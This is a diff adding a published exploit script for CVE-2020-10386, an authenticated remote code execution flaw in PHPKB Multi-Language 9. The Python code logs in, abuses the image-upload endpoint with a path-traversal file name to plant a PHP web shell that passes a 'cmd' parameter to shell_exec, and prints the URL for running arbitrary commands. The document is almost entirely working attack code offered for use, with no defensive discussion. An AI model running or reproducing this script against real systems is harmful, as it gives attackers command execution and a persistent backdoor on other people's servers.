@@ -1,0 +1,31 @@
+# Exploit Title: PHPKB Multi-Language 9 - 'image-upload.php' Authenticated Remote Code Execution
+# Google Dork: N/A
+# Date: 2020-03-15
+# Exploit Author: Antonio Cannito
+# Vendor Homepage: https://www.knowledgebase-script.com/
+# Software Link: https://www.knowledgebase-script.com/pricing.php
+# Version: Multi-Language v9
+# Tested on: Windows 8.1 / PHP 7.4.3
+# CVE : CVE-2020-10386
+
+
+#!/usr/bin/env python3
+import argparse
+import requests
+from json import loads
+
+#Parsing arguments
+parser = argparse.ArgumentParser(description="Exploiting CVE-2020-10386 - Remote Code Execution via .php file upload in admin/imagepaster/image-upload.php in Chadha PHPKB Standard Multi-Language 9")
+parser.add_argument("url", type=str, help="PHPKB's base path")
+parser.add_argument("username", type=str, help="Superuser/Writer/Translator/Editor username")
+parser.add_argument("password", type=str, help="Superuser/Writer/Translator/Editor password")
+parser.add_argument("command", type=str, help="The command you want to execute")
+args = parser.parse_args()
+
+session = requests.Session()
+#Perform login
+session.post(args.url + "/admin/login.php", data={'phpkb_username': args.username, 'phpkb_password': args.password, 'login': 'LOGIN'}).text
+#Sending exploit code
+baseurl = loads(session.post(args.url + "/admin/imagepaster/image-upload.php", files={'file': "<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>"}, data={'action': 'imageinsert_upload', 'imgMime': 'image/php', 'imgName': '../js/index.png', 'imgParent': 'null'}).text)["url"]
+print("Visit this page to execute the command:\n" + baseurl + "?cmd=" + args.command)
+print("\nIf you want to execute other commands you can re-execute the exploit or visit this webpage, followed by the command you want executed:\n" + baseurl + "?cmd=")
